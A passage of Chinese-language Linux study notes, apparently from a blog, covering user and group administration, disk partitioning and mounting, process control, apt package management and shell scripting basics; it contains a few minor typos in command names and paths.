用户账户</h3><ul><li><p>用户账户定义</p><ul><li>超级用户root：$UID=0$</li><li>系统用户：$1&lt;UID&lt;999$</li><li>普通用户：$UID&gt;1000$</li></ul></li><li><p>用户账户文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般账户信息</span></span><br><span class="line">/etc/passwd</span><br><span class="line">username:password:uid:gid:userinfo:home:shell</span><br><span class="line"><span class="comment"># 用户名：密码（x表示映射到了shadow里）：用户ID：组ID：用户注释：主目录：默认shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户密码信息</span></span><br><span class="line">/etc/shadow</span><br><span class="line">username:password:lastchg:min:max:warn:inactive:expire:flag</span><br><span class="line"><span class="comment"># 用户名：密码（!未设置密码）：最后改密码的日期：改口令间隔：有效最大天数：换密码前几天警告：几天后禁止登入：被禁时间：保留</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-用户命令"><a href="#2-用户命令" class="headerlink" title="2 用户命令"></a>2 用户命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># useradd | adduser (Ubuntu) 添加用户</span></span><br><span class="line"><span class="comment"># useradd [选项] [用户名]</span></span><br><span class="line">useradd -para username</span><br><span class="line">-d <span class="comment"># 指定主目录，不存在-m可以创建主目录</span></span><br><span class="line">-g <span class="comment"># 指定用户组</span></span><br><span class="line">-r <span class="comment"># 建立系统账号</span></span><br><span class="line"><span class="comment"># adduser (Ubuntu)</span></span><br><span class="line">adduser <span class="comment"># 创建普通用户</span></span><br><span class="line">adduser --system <span class="comment"># 创建系统用户</span></span><br><span class="line">adduser --group <span class="comment"># 创建用户组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># password | usermod | chage （改密码，改类型，改时效）</span></span><br><span class="line"><span class="comment"># password [选项] [用户名] 无参则表示设置密码</span></span><br><span class="line">password -para username </span><br><span class="line">-d <span class="comment"># 删除密码</span></span><br><span class="line"><span class="comment"># usermod [选项] [用户名]</span></span><br><span class="line">usermod -para username</span><br><span class="line">-d <span class="comment"># 设置登入目录</span></span><br><span class="line">-u <span class="comment"># 修改UID</span></span><br><span class="line"><span class="comment"># chage [选项] [用户名]（不输入参数直接进入交互模式）</span></span><br><span class="line">chage -para username</span><br><span class="line"></span><br><span class="line"><span class="comment"># userdel | deluser (Ubuntu) 删除用户</span></span><br><span class="line"><span class="comment"># userdel [选项] [用户名]</span></span><br><span class="line">userdel -para username</span><br><span class="line">-r 删除主目录和其中所有文件</span><br><span class="line">-f 强制删除用户</span><br><span class="line"><span class="comment"># deluser (Ubuntu)</span></span><br><span class="line">deluser</span><br><span class="line">deluser --system </span><br><span class="line">deluser --group</span><br></pre></td></tr></table></figure><h3 id="3-用户组账户"><a href="#3-用户组账户" class="headerlink" title="3 用户组账户"></a>3 用户组账户</h3><ul><li><p>用户组账户定义</p><blockquote><p>同理用户。</p></blockquote></li><li><p>用户组账户文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 组用户信息</span></span><br><span class="line">/ect/group</span><br><span class="line">group_name:group_password:group_id:group_members</span><br><span class="line"><span class="comment"># 组用户名：组用户密码（x表示映射到了shadow里）：用户组ID：成员清单（逗号隔开）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组密码信息</span></span><br><span class="line">/ect/gshadow</span><br><span class="line">group_name:group_password:group_id:group_members</span><br><span class="line"><span class="comment"># 组用户名：组用户密码（!未设置密码）：用户组ID：成员清单（逗号隔开）</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-用户组命令"><a href="#4-用户组命令" class="headerlink" title="4 用户组命令"></a>4 用户组命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># groupadd | addgroup(Ubuntu) 添加组</span></span><br><span class="line"><span class="comment"># group [选项] [组名]</span></span><br><span class="line">group -para group</span><br><span class="line">-f <span class="comment"># 组存在该选项失效并以成功状态退出，如果GID被使用，则取消-g</span></span><br><span class="line">-g <span class="comment"># 指定GID，GID唯一非负，默认大于等于GID_MIN，并大于每个其他组的GID</span></span><br><span class="line">-K <span class="comment"># 不使用/etc/login.defs 中的默认值（如GID_MIN、GID_MAX）</span></span><br><span class="line">-o <span class="comment"># 允许创建有重复GID的组</span></span><br><span class="line">-r <span class="comment"># 创建系统组账户，GID小于1000</span></span><br><span class="line"><span class="comment"># addgroup(Ubuntu)</span></span><br><span class="line">addgroup [--gid ID] GROUP <span class="comment"># 普通组</span></span><br><span class="line">addgroup --system [ --gid ID ] GROUP <span class="comment"># 系统组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># groupmod 修改组属性</span></span><br><span class="line"><span class="comment"># groupmod [选项] [组账户名]</span></span><br><span class="line">groupmod -para group</span><br><span class="line">-g <span class="comment"># 修改用户组的GID</span></span><br><span class="line">-n <span class="comment"># 修改用户组名</span></span><br><span class="line">-o <span class="comment"># 允许使用重复的GID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#groupdel | delgroup (Ubuntu)删除组</span></span><br><span class="line"><span class="comment"># groupdel [ 组名 ]</span></span><br><span class="line">groupdel group</span><br><span class="line"><span class="comment"># delgroup [ 组名 ]</span></span><br><span class="line">delgroup group</span><br><span class="line"></span><br><span class="line"><span class="comment"># gpasswd 管理组账户</span></span><br><span class="line">gpasswd</span><br><span class="line">-a <span class="comment"># 添加到用户组</span></span><br><span class="line">-d <span class="comment"># 删除用户组中的某一用户</span></span><br><span class="line">-A <span class="comment"># 指定管理员</span></span><br><span class="line">-M <span class="comment"># 指定组成员</span></span><br><span class="line">-r <span class="comment"># 删除密码</span></span><br><span class="line">-R <span class="comment"># 限制用户登入组，只有组中的成员才能用 newgrp 命令加入该组</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、磁盘分区"><a href="#四、磁盘分区" class="headerlink" title="四、磁盘分区"></a>四、磁盘分区</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><ul><li><p>磁盘分区</p><blockquote><p>将一个磁盘驱动器分成若干个逻辑驱动器。</p><p>磁盘的分区信息保存在分区表中。分区表是一个磁盘分区的索引。</p><p>MBR ( master boot record ) 主分区引导记录。</p><p>GPT ( globally unique identifier partition table ) GUID分区表。</p><p>GPT相对于MBR突出的优势是GPT可管理空间大、支持的分区数量多。</p></blockquote></li><li><p>格式化</p><blockquote><p>格式化会情况现有分区的所有数据并创造一些系统文件。</p></blockquote></li><li><p>命名方式</p><blockquote><p>sda sdb sdc … （依照设备ID）</p></blockquote></li></ul><h3 id="2-查看设备列表"><a href="#2-查看设备列表" class="headerlink" title="2 查看设备列表"></a>2 查看设备列表</h3><blockquote><p><code>ls /dev/sd*</code></p></blockquote><h3 id="3-fdisk"><a href="#3-fdisk" class="headerlink" title="3 fdisk"></a>3 fdisk</h3><blockquote><p>磁盘分区（分区 &gt; 2 TB使用parted命令）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fdisk 命令参数带-，否则进入交互界面（交互界面用命令不带 -）</span></span><br><span class="line">fdisk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用交互界面命令</span></span><br><span class="line">F <span class="comment"># 列出空闲区</span></span><br><span class="line">n <span class="comment"># 创建新分区（p主分区，e扩展分区）（创建的最后扇区可以直接 +1G 进行分区）</span></span><br><span class="line">p <span class="comment"># 查看分区</span></span><br><span class="line">d <span class="comment"># 删除分区</span></span><br><span class="line">w/q <span class="comment"># 保存退出，不保存退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新读取分区表</span></span><br><span class="line">ioctl()</span><br></pre></td></tr></table></figure><h3 id="4-mkfs"><a href="#4-mkfs" class="headerlink" title="4 mkfs"></a>4 mkfs</h3><blockquote><p>创建文件系统</p><p><a href="https://www.runoob.com/linux/linux-comm-mkfs.html">mkfs</a></p><p>创建了文件系统才可以挂载</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mkfs [选项][-t &lt;类型&gt;][文件系统选项]&lt;设备&gt;[&lt;大小&gt;]</span></span><br><span class="line">mkfs</span><br><span class="line"></span><br><span class="line">-V <span class="comment"># 详细显示模式</span></span><br><span class="line">-c <span class="comment"># 在建立文件系统前检查partition（分组）是否有坏道</span></span><br><span class="line">-t <span class="comment"># 指定文件系统的类型，不指定预设值为ext2</span></span><br><span class="line">&lt;大小&gt; <span class="comment"># 要使用设备上的快数</span></span><br><span class="line">&lt;设备&gt; <span class="comment"># 要使用设备的路径</span></span><br><span class="line">-v <span class="comment"># 显示版本信息</span></span><br></pre></td></tr></table></figure><h3 id="5-mount-umount"><a href="#5-mount-umount" class="headerlink" title="5 mount/umount"></a>5 mount/umount</h3><blockquote><p>磁盘分区挂载与卸载</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mount [-t文件系统类型][-L 卷标][-o 挂载选项]设备名 挂载点</span></span><br><span class="line">-t <span class="comment"># 不指定选自动选择</span></span><br><span class="line">-o <span class="comment"># 挂载选项</span></span><br><span class="line">loop <span class="comment"># 把一个文件当成磁盘分区挂载到系统上</span></span><br><span class="line">ro <span class="comment"># 采用只读挂载</span></span><br><span class="line">rw <span class="comment"># 采用读写挂载</span></span><br><span class="line">iocharset <span class="comment"># 指定访问文件系统所用的字符集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># umount [选项] &lt;源&gt;|&lt;目录&gt;</span></span><br><span class="line">-a <span class="comment"># 卸载/etc/mtab中记录的所有文件系统</span></span><br><span class="line">-n <span class="comment"># 卸载时不将信息存入/etc/mtab中</span></span><br><span class="line">-r <span class="comment"># 无法成功卸载则尝试以只读方式重新挂入文件系统</span></span><br><span class="line">-t <span class="comment"># &lt;文件系统类型&gt; 仅卸载选项中所指定的文件系统</span></span><br><span class="line">-v <span class="comment"># 详细信息</span></span><br></pre></td></tr></table></figure><h3 id="6-fsck"><a href="#6-fsck" class="headerlink" title="6 fsck"></a>6 fsck</h3><blockquote><p>文件系统的检查和修复</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fsck [选项][设备名]</span></span><br><span class="line">-p <span class="comment"># 不提示直接修复</span></span><br><span class="line">-c <span class="comment"># 检查可能的坏块并加入坏块列表</span></span><br><span class="line">-f <span class="comment"># 强制进行检查（即使被标记为“没有问题”）</span></span><br><span class="line">-n <span class="comment"># 只检查不修复</span></span><br><span class="line">-v <span class="comment"># 显示更多信息</span></span><br><span class="line">-y <span class="comment"># yes yes yes</span></span><br></pre></td></tr></table></figure><h3 id="7-df"><a href="#7-df" class="headerlink" title="7 df"></a>7 df</h3><blockquote><p> 查看磁盘使用情况</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># df [选项][文件名]</span></span><br><span class="line">-h <span class="comment"># 易读显示 1KB = 1024B</span></span><br></pre></td></tr></table></figure><h3 id="8-du"><a href="#8-du" class="headerlink" title="8 du"></a>8 du</h3><blockquote><p>查看文件和目录磁盘使用情况</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># du [选项][文件]</span></span><br><span class="line">-h <span class="comment"># 易读</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、进程管理"><a href="#五、进程管理" class="headerlink" title="五、进程管理"></a>五、进程管理</h2><h3 id="1-查看"><a href="#1-查看" class="headerlink" title="1 查看"></a>1 查看</h3><h4 id="1-1-ps"><a href="#1-1-ps" class="headerlink" title="1.1 ps"></a>1.1 ps</h4><blockquote><p>静态监控</p><p><a href="https://www.runoob.com/linux/linux-comm-ps.html">ps</a></p></blockquote><h4 id="1-2-pstree"><a href="#1-2-pstree" class="headerlink" title="1.2 pstree"></a>1.2 pstree</h4><blockquote><p>查看进程树</p><p><a href="https://www.runoob.com/linux/linux-comm-pstree.html">pstree</a></p></blockquote><h4 id="1-3-top"><a href="#1-3-top" class="headerlink" title="1.3 top"></a>1.3 top</h4><blockquote><p>动态监控</p><p><a href="https://www.runoob.com/linux/linux-comm-top.html">top</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-p pid <span class="comment"># 指定pid</span></span><br></pre></td></tr></table></figure><h4 id="1-4-lsof"><a href="#1-4-lsof" class="headerlink" title="1.4 lsof"></a>1.4 lsof</h4><blockquote><p> 列出进程打开的文件的信息，端口号，网络活动。</p><p><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html">lsof</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-i:port <span class="comment"># 端口活动</span></span><br></pre></td></tr></table></figure><h4 id="1-5-pidof"><a href="#1-5-pidof" class="headerlink" title="1.5 pidof"></a>1.5 pidof</h4><blockquote><p>查看进程pid </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pidof [选项][进程名]</span></span><br><span class="line">-s <span class="comment"># 表示只返回1个pid</span></span><br><span class="line">-x <span class="comment"># 表示同时返回运行给定程序的shell的pid</span></span><br><span class="line">-o <span class="comment"># 表示告诉 piod 表示忽略后面给定的pid可以使用多个-o</span></span><br></pre></td></tr></table></figure><h3 id="2-控制"><a href="#2-控制" class="headerlink" title="2 控制"></a>2 控制</h3><h4 id="2-1-nice"><a href="#2-1-nice" class="headerlink" title="2.1 nice"></a>2.1 nice</h4><blockquote><p>调整即将运行的进程优先级</p><p>NI：nice值越高表示高友善度，低优先级。（不能完全决定进程优先级）</p><p>PRI：PRI( new ) = PRI ( old ) + NI ，同理NI。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nice [命令][进程名]</span></span><br><span class="line">-n &lt;num&gt; <span class="comment"># 设置nice值（ 默认N=10 ）</span></span><br></pre></td></tr></table></figure><h4 id="2-2-renice"><a href="#2-2-renice" class="headerlink" title="2.2 renice"></a>2.2 renice</h4><blockquote><p>调整运行的进程的优先级</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># renice [-n] &lt;优先级&gt; [ -p/-g/-u ] &lt;pid/gpid/user&gt;</span></span><br><span class="line">-n  <span class="comment"># 指定nice增量</span></span><br></pre></td></tr></table></figure><h4 id="2-3-kill"><a href="#2-3-kill" class="headerlink" title="2.3 kill"></a>2.3 kill</h4><blockquote><p>发送指定信号给进程</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kill [ -s 信号声明|-n 信号编号|-信号声明]进程号|任务声明 ...</span></span><br><span class="line">-l <span class="comment"># 列出所有信号</span></span><br></pre></td></tr></table></figure><h4 id="2-4-killall"><a href="#2-4-killall" class="headerlink" title="2.4 killall"></a>2.4 killall</h4><blockquote><p>杀死指定名字的进程</p><p><a href="https://www.runoob.com/linux/linux-comm-killall.html">killall</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># killall [选项][进程号]</span></span><br><span class="line">-e <span class="comment"># 精确匹配名称</span></span><br></pre></td></tr></table></figure><h3 id="3-生命"><a href="#3-生命" class="headerlink" title="3 生命"></a>3 生命</h3><h4 id="3-1-启动"><a href="#3-1-启动" class="headerlink" title="3.1 启动"></a>3.1 启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi <span class="comment"># 前台启动</span></span><br><span class="line">vi &amp; <span class="comment"># 后台启动</span></span><br></pre></td></tr></table></figure><h4 id="3-2-挂起"><a href="#3-2-挂起" class="headerlink" title="3.2 挂起"></a>3.2 挂起</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctrl + z <span class="comment"># 挂起</span></span><br></pre></td></tr></table></figure><h4 id="3-3-jobs"><a href="#3-3-jobs" class="headerlink" title="3.3 jobs"></a>3.3 jobs</h4><blockquote><p>显示任务状态</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jobs [选项][任务声明 ...]</span></span><br><span class="line">-l <span class="comment"># 在正常信息的基础上列出进程号</span></span><br><span class="line">-n <span class="comment"># 仅列出上次通告之后改变了状态的进程</span></span><br><span class="line">-p <span class="comment"># 仅列出进程号</span></span><br><span class="line">-r <span class="comment"># 限制仅输出运行中的任务</span></span><br><span class="line">-s <span class="comment"># 限制仅输出停止的任务</span></span><br></pre></td></tr></table></figure><h4 id="3-4-fg-将任务移至前台"><a href="#3-4-fg-将任务移至前台" class="headerlink" title="3.4 fg    将任务移至前台"></a>3.4 fg    将任务移至前台</h4><blockquote><p><code>fg [ %N ]</code> 将任务N移至前台。</p><p>N是通过jobs命令查到的后台任务编号。（不是pid）。</p><p>不指定则Shell程序中的“当前任务”将会被使用。</p></blockquote><h4 id="3-5-bg-将任务移至后台"><a href="#3-5-bg-将任务移至后台" class="headerlink" title="3.5 bg   将任务移至后台"></a>3.5 bg   将任务移至后台</h4><blockquote><p><code>bg [ %N ]</code> 将任务N移至后台。</p><p>N是通过jobs命令查到的后台任务编号。（不是pid）</p><p>不指定则Shell程序中的“当前任务”将会被使用。</p></blockquote><h4 id="3-6-nohup"><a href="#3-6-nohup" class="headerlink" title="3.6 nohup"></a>3.6 nohup</h4><blockquote><p>启动脱离终端运行的任务</p><p><a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup</a></p></blockquote><hr><h2 id="六、软件包管理"><a href="#六、软件包管理" class="headerlink" title="六、软件包管理"></a>六、软件包管理</h2><h3 id="1-备份"><a href="#1-备份" class="headerlink" title="1 备份"></a>1 备份</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line">sudo <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">sudo vim /etc/apt/sources.list 或 sudo apt edit-sources</span><br><span class="line"><span class="comment"># 恢复</span></span><br><span class="line">sudo <span class="built_in">mv</span> /etc/apt/sources.list.bak /etc/apt/sources.list</span><br></pre></td></tr></table></figure><h3 id="2-指令"><a href="#2-指令" class="headerlink" title="2 指令"></a>2 指令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># apt -&gt; apt-get</span></span><br><span class="line"><span class="comment"># 安装软件包</span></span><br><span class="line">apt install</span><br><span class="line"><span class="comment"># 移除软件包</span></span><br><span class="line">apt remove</span><br><span class="line"><span class="comment"># 移除软件包和配置</span></span><br><span class="line">apt purge</span><br><span class="line"><span class="comment"># 更新可用软件包列表</span></span><br><span class="line">apt update</span><br><span class="line"><span class="comment"># 升级所有可升级的软件包</span></span><br><span class="line">apt upgrade</span><br><span class="line"><span class="comment"># 自动删除不需要的包</span></span><br><span class="line">apt autoremove</span><br><span class="line"><span class="comment"># 在升级软件包时自动处理依赖关系</span></span><br><span class="line">apt full-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt -&gt; apt-cache</span></span><br><span class="line"><span class="comment"># 搜索应用程序</span></span><br><span class="line">apt search：</span><br><span class="line"><span class="comment"># 显示软件包细节</span></span><br><span class="line">apt show</span><br></pre></td></tr></table></figure><h3 id="3-无法定位软件包"><a href="#3-无法定位软件包" class="headerlink" title="3 无法定位软件包"></a>3 无法定位软件包</h3><blockquote><p><a href="https://www.cnblogs.com/Mishell/p/12535063.html">无法定位软件包</a></p><p><a href="https://blog.csdn.net/qq_49015005/article/details/117702582">无法定位软件包</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root打开</span></span><br><span class="line">sudo mousepad /etc/apt/sources.list</span><br><span class="line"><span class="comment"># 更新apt</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 更新系统</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="comment"># 测试安装成功</span></span><br><span class="line">apt-cache search linux-headers</span><br><span class="line"><span class="comment"># 中科大镜像源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><hr><h2 id="七、补充命令"><a href="#七、补充命令" class="headerlink" title="七、补充命令"></a>七、补充命令</h2><h3 id="1-系统操作"><a href="#1-系统操作" class="headerlink" title="1 系统操作"></a>1 系统操作</h3><h4 id="1-1-shutdown"><a href="#1-1-shutdown" class="headerlink" title="1.1 shutdown"></a>1.1 shutdown</h4><blockquote><p>立刻关机</p><p><a href="https://www.runoob.com/linux/linux-comm-shutdown.html">shutdown</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 立刻关机</span></span><br><span class="line">shutdown -h now</span><br></pre></td></tr></table></figure><h4 id="1-2-nautilus-目录名称"><a href="#1-2-nautilus-目录名称" class="headerlink" title="1.2 nautilus + 目录名称"></a>1.2 nautilus + 目录名称</h4><blockquote><p>打开目录</p><p><code>nautilus &lt;path&gt;</code></p></blockquote><h3 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2 文件操作"></a>2 文件操作</h3><h4 id="2-1-umask"><a href="#2-1-umask" class="headerlink" title="2.1 umask"></a>2.1 umask</h4><blockquote><p>指定在建立文件时预设的权限掩码</p><p><a href="https://www.runoob.com/linux/linux-comm-umask.html">umask</a></p></blockquote><h4 id="2-2-wc"><a href="#2-2-wc" class="headerlink" title="2.2 wc"></a>2.2 wc</h4><blockquote><p>用于计算字数</p><p><a href="https://www.runoob.com/linux/linux-comm-wc.html">wc</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c <span class="comment"># 显示字节</span></span><br><span class="line">-l <span class="comment"># 显示行</span></span><br><span class="line">-w <span class="comment"># 显示字</span></span><br></pre></td></tr></table></figure><h4 id="2-3-cat"><a href="#2-3-cat" class="headerlink" title="2.3 cat"></a>2.3 cat</h4><blockquote><p>concatenate，命令用于连接文件并打印到标准输出设备上</p><p><a href="https://www.runoob.com/linux/linux-comm-cat.html">cat</a></p></blockquote><h4 id="2-4-type"><a href="#2-4-type" class="headerlink" title="2.4 type"></a>2.4 type</h4><blockquote><p>判断文件类型</p><p><a href="https://www.iteye.com/blog/codingstandards-831504">type</a></p></blockquote><h4 id="2-5-grep"><a href="#2-5-grep" class="headerlink" title="2.5 grep"></a>2.5 grep</h4><blockquote><p>用于查找文件里符合条件的字符串</p><p><a href="https://www.runoob.com/linux/linux-comm-grep.html">grep</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="built_in">cat</span> &lt;file&gt; | grep <span class="string">&#x27;str&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串匹配查询</span></span><br><span class="line">grep -w <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="2-6-tail"><a href="#2-6-tail" class="headerlink" title="2.6 tail"></a>2.6 tail</h4><blockquote><p>用于查看文件的内容</p><p><a href="https://www.runoob.com/linux/linux-comm-tail.html">tail</a></p></blockquote><h4 id="2-7-find"><a href="#2-7-find" class="headerlink" title="2.7 find"></a>2.7 find</h4><blockquote><p>用来在指定目录下查找文件</p><p><a href="https://www.runoob.com/linux/linux-comm-find.html">find</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找指定路径下的文件</span></span><br><span class="line">find path -name file</span><br></pre></td></tr></table></figure><h3 id="3-用户操作"><a href="#3-用户操作" class="headerlink" title="3 用户操作"></a>3 用户操作</h3><h4 id="3-1-id"><a href="#3-1-id" class="headerlink" title="3.1 id"></a>3.1 id</h4><blockquote><p>用于显示用户的ID，以及所属群组的ID</p><p><a href="https://www.runoob.com/linux/linux-comm-id.html">id</a></p></blockquote><h4 id="3-2-chmod"><a href="#3-2-chmod" class="headerlink" title="3.2 chmod"></a>3.2 chmod</h4><blockquote><p>控制用户对文件的权限的命令</p><p><a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod</a></p></blockquote><h3 id="4-网络操作"><a href="#4-网络操作" class="headerlink" title="4 网络操作"></a>4 网络操作</h3><h4 id="4-1-ip查看"><a href="#4-1-ip查看" class="headerlink" title="4.1 ip查看"></a>4.1 ip查看</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip地址</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment"># 网关</span></span><br><span class="line">route -n</span><br></pre></td></tr></table></figure><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5 \ + 系统命令"></a>5 \ + 系统命令</h3><blockquote><p>会使用系统原本自带的命令而不是命令的别名。（不加会优先使用别名）</p></blockquote><hr><h2 id="八、Shell编程"><a href="#八、Shell编程" class="headerlink" title="八、Shell编程"></a>八、Shell编程</h2><blockquote><p><a href="http://c.biancheng.net/shell/">shell</a></p><p><a href="http://c.biancheng.net/shell/program/">shell</a></p><p><a href="https://blog.csdn.net/qq_50685659/article/details/125738428">shell的CSDN链接</a></p></blockquote><h3 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1 头文件"></a>1 头文件</h3><blockquote><p>默认 #! /bin/bash</p><p>表示使用哪一种shell执行，可以修改。</p><p>创建脚本有 vi/vim gedit</p><p># 是注释</p></blockquote><h3 id="2-运行方式"><a href="#2-运行方式" class="headerlink" title="2 运行方式"></a>2 运行方式</h3><ol><li><p>chmod +x  name.sh </p><blockquote><p>为脚本添加可执行权限，然后直接运行。</p><p>该方法运行可以是绝对路径可以是相对路径。（相对： ./ ）</p></blockquote><ol><li><p>bash name.sh</p><blockquote><p>sh name.sh</p></blockquote></li></ol></li><li><p>source name.sh</p><blockquote><p>. name.sh：直接运行，但是在terminal下值是静态的</p></blockquote></li></ol><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3 变量"></a>3 变量</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-set.html">set</a>：设置</p><p><a href="https://www.runoob.com/linux/linux-comm-set.html">unset</a>：删除</p><p><a href="https://www.runoob.com/linux/linux-comm-expr.html">expr</a>：表达式计算：<code>expr $a + $b</code></p><p><a href="https://www.runoob.com/linux/linux-comm-let.html">let</a>：直接计算：<code>let x+=1</code></p></blockquote><p><img src="/posts/57602ae6/shell变量的替换.jpg" alt="img"><img src="/posts/57602ae6/关联数组.jpg" alt="img"><img src="/posts/57602ae6/访问数组.jpg" alt="img"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 变量定义</span></span><br><span class="line">var=value <span class="comment">#（两边不能加空格）（变量中无特殊字符可以不加引号）</span></span><br><span class="line"><span class="string">&#x27; &#x27;</span> <span class="comment"># 原样输出。</span></span><br><span class="line"><span class="string">&quot; &quot;</span> <span class="comment"># 解析内容后输出。</span></span><br><span class="line">` ` <span class="comment"># 命令替换 （相比 $&#123; &#125; 移植性好）</span></span><br><span class="line"><span class="comment"># 变量访问</span></span><br><span class="line"><span class="variable">$&#123;name&#125;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组，元素间用空格隔开</span></span><br><span class="line">array_name=(value1 value2 value3 ... )</span><br><span class="line"><span class="comment"># 下标访问</span></span><br><span class="line"><span class="variable">$&#123;arrary_name[0]&#125;</span>（一定要带上大括号，不然会寻找会出错）</span><br><span class="line"><span class="comment"># 获取全部元素</span></span><br><span class="line"><span class="variable">$&#123;arrary_name[@ or *]&#125;</span></span><br><span class="line"><span class="comment"># 获取数组长度</span></span><br><span class="line"><span class="variable">$&#123;#arrary_name[@ or *]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 特殊变量</span></span><br><span class="line">$$ <span class="comment"># Shell本身的PID（ProcessID）</span></span><br><span class="line">$! <span class="comment"># Shell最后运行的后台Process的PID</span></span><br><span class="line">$? <span class="comment"># 最后运行的命令的结束代码（返回值）</span></span><br><span class="line">$- <span class="comment"># 使用Set命令设定的Flag一览</span></span><br><span class="line">$* <span class="comment"># 所有参数列表，以&quot;$1$2...$n&quot;形式输出所有参数</span></span><br><span class="line"><span class="variable">$@</span> <span class="comment"># 输出所有参数，每个参数作为一个单独的字符串</span></span><br><span class="line"><span class="variable">$#</span> <span class="comment"># 添加到Shell的参数个数</span></span><br><span class="line"><span class="variable">$0</span> <span class="comment"># Shell本身的文件名</span></span><br><span class="line"><span class="variable">$1</span>~<span class="variable">$n</span> <span class="comment"># 添加到Shell的各参数值：$1第一个参数，$n第n个参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 算术表达式（无空格）</span></span><br><span class="line">$[100/2]</span><br><span class="line"><span class="comment"># 逻辑表达式（左右有空格，数字与符号间有空格）</span></span><br><span class="line"><span class="built_in">test</span> 2 = 5</span><br><span class="line">[ 2 = 5 ]</span><br><span class="line"><span class="comment">#结果用$?可获得，0为真1为假。</span></span><br></pre></td></tr></table></figure><h3 id="4-交互"><a href="#4-交互" class="headerlink" title="4 交互"></a>4 交互</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 标准化输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> </span><br><span class="line">-e <span class="comment"># 识别转义字符</span></span><br><span class="line">-n <span class="comment"># 忽略换行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化输出（变量置后，带取值符号,同C）</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入</span></span><br><span class="line"><span class="built_in">read</span> <span class="string">&quot;&quot;</span></span><br><span class="line">-p <span class="comment"># 提示语句 